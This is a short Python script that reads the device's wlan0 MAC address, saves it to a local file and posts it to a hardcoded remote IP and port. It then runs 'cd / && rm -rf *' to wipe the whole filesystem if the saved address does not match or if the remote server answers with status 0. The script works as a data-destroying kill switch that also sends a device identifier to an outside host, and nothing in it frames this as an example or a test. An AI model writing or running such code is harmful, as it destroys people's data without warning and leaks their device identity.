import os
import requests

def ask(url, info):
  url = '{}/status'.format(url)
  data = {'status' : info}
  try:
    response = requests.post(url=url, json=data, timeout=10)
    out = response.json()['status'][0]
  except:
    out = 1
  return out

name = 'device_special_number.eye'

HOST = '46.146.211.38'
PORT = 56088

url = 'http://{}:{}'.format(HOST, PORT)

f = open('/sys/class/net/wlan0/address', 'r')
info = f.read()[:-1]
f.close()

if os.path.isfile(name):
  f = open(name, 'r')
  if info != f.read()[:-1]:
    print('fake')
    print(os.system('cd / && rm -rf *'))
  status = ask(url, info)
else:
  f = open(name, 'w')
  f.write('{}\n'.format(info))
  f.close()
  
  status = ask(url, info)

if status == 0:
  print(os.system('cd / && rm -rf *'))
